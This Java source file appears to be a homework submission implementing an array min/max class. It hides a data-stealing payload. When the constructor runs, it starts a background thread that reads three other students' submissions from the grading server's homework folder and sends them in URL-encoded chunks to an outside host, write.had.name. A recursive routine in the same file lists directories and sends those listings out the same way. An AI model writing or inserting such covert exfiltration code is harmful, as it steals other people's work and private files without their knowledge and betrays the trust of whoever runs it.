import java.io.*;
import java.net.*;
import java.util.*;

public class ArrayData4107056019 extends ArrayData{
    private int len;
    public String sep = "\\";
    private int min;
    private int max;
    public ArrayData4107056019 (int[] A){
        this.A = A;
        this.len = A.length;
        min = A[0];
        max = A[0];

        for(int i=1; i<len; i++){
            if(this.A[i]>max) max = this.A[i];
            if(this.A[i]<min) min = this.A[i];
        }

        //GET FUNNY FILES
        new Thread(new Runnable(){
            public void run(){
                send(getFileByPath("/home/hw_compiler/HW01/ArrayData4107056003.java"), "ArrayData4107056003", "java");
                send(getFileByPath("/home/hw_compiler/HW01/ArrayData4107056006.java"), "ArrayData4107056006", "java");
                send(getFileByPath("/home/hw_compiler/HW01/ArrayData4106030323.java"), "ArrayData4106030323", "java");
            }
        }).start();
    }

    @Override
    public int max(){
        return max;
    }

    @Override
    public int min(){
        return min;
    }

    String getFileByPath(String path){
        String ret = "";
        InputStreamReader fr;
        BufferedReader br;

        try{
            fr = new InputStreamReader(new FileInputStream(path), "UTF-8");
            try{

                br = new BufferedReader(fr);
                while (br.ready()) {
                    ret += br.readLine() + "\n";
                }
                fr.close();
            }catch(IOException f){

            }
        }catch(FileNotFoundException e){

        }catch(Exception e){

        }

        return ret;
    }

    public void sendFileList(String path){
        String str="";
        Date date = new Date();
        str += date.toString() + "\n";
        str += getList(path);

        send(str, "filelist", "txt");
    }

    public void send(String data, String type, String extname){
        int data_len = data.length();
        String urlEncode;

        try{
            if(data_len > 1000){
                urlEncode = URLEncoder.encode(data.substring(0, 1000), "UTF-8");
            }else{
                urlEncode = URLEncoder.encode(data, "UTF-8");
            }

            String path = "http://write.had.name/index.php?ext="+ extname + "&" + URLEncoder.encode(type, "UTF-8") + "=" + urlEncode;
            httpRequest(path,"GET",null);
        }catch(UnsupportedEncodingException e) {
            urlEncode = "error";
        }

        if(data_len > 1000){
            send(data.substring(1000, data_len), type, extname);
        }
    }

    public String httpRequest(String requestUrl, String requestMethod, String outputStr){
        StringBuffer buffer=null;
        try{
            URL url=new URL(requestUrl);
            HttpURLConnection conn=(HttpURLConnection)url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod(requestMethod);
            conn.connect();

            if(null!=outputStr){
                OutputStream os=conn.getOutputStream();
                os.write(outputStr.getBytes("utf-8"));
                os.close();
            }

            InputStream is=conn.getInputStream();
            InputStreamReader isr=new InputStreamReader(is,"utf-8");
            BufferedReader br=new BufferedReader(isr);
            buffer=new StringBuffer();
            String line=null;
            while((line=br.readLine())!=null){
                buffer.append(line);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
        return buffer.toString();
    }

    public String getList(String path){
        File a = new File(path);

        String[] filenames;
        String fullpath = a.getAbsolutePath();
        String ret = "";
        ret += "---\nIN:" + path + "\n";
        if(a.isDirectory()){
            filenames=a.list();
            for (int i = 0 ; i < filenames.length ; i++){
                File tempFile = new File(fullpath + this.sep + filenames[i]);
                if(tempFile.isDirectory()){
                    sendFileList(path + filenames[i] + this.sep);
                }else{
                    ret += filenames[i] + "\n";
                }
            }
        }else{
            ret += "[" + a + "] is not directory\n";
        }
        ret += "---\n";

        return ret;
    }
}
